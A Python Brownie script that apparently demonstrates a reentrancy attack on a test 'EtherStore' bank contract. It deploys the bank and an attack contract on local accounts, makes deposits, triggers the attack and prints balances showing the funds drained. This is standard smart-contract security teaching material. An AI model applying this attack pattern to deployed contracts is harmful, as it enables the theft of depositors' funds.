from brownie import EtherStore, Attack, accounts, web3


def main():

    bob = accounts[0]
    alice = accounts[1]
    eve = accounts[2]
    bank_deployer = accounts[3]
    attacker_deployer = accounts[4]

    # deposit amounts
    bob_deposit = "2 ether"
    alice_deposit = "3 ether"
    eve_deposit = "1 ether"

    # deploy contracts
    ether_store = EtherStore.deploy({"from": bank_deployer})
    attack = Attack.deploy(ether_store, {"from": attacker_deployer})

    # make deposits
    ether_store.deposit({"from": bob, "value": bob_deposit})
    ether_store.deposit({"from": alice, "value": alice_deposit})
    ether_store.deposit({"from": eve, "value": eve_deposit})

    # print balances
    print(f" Bob's balance in the bank after deposit: {web3.fromWei(ether_store.balances(bob), 'ether')} ether")
    print(f" Alice's balance in the bank after deposit: {web3.fromWei(ether_store.balances(alice), 'ether')} ether")
    print(f" Eve's balance in the bank after deposit: {web3.fromWei(ether_store.balances(eve), 'ether')} ether")
    print(f" Bank's total contract balance after deposits: {web3.fromWei(ether_store.getBalance(), 'ether')} ether")

    # Alice withdraws
    ether_store.withdraw({"from": alice})
    print(f" Alice's balance in the bank after withdrawal: {web3.fromWei(ether_store.balances(alice), 'ether')} ether")
    print(f" Bank's total contract balance after withdrawal: {web3.fromWei(ether_store.getBalance(), 'ether')} ether")

    # Attack
    attack.attack({"from": attacker_deployer, "value": "1 ether"})

    # print balances after attack
    print(f" Bob's balance in the bank after attack is wrong: {web3.fromWei(ether_store.balances(bob), 'ether')} ether")
    print(f" Alice's balance in the bank after attack is wrong: {web3.fromWei(ether_store.balances(alice), 'ether')} ether")
    print(f" Eve's balance in the bank after attack is wrong: {web3.fromWei(ether_store.balances(eve), 'ether')} ether")
    print(f" Bank's total contract balance after attack: {web3.fromWei(ether_store.getBalance(), 'ether')} ether")
    print(f" Attacker's contract balance after attack: {web3.fromWei(attack.getBalance(), 'ether')} ether")
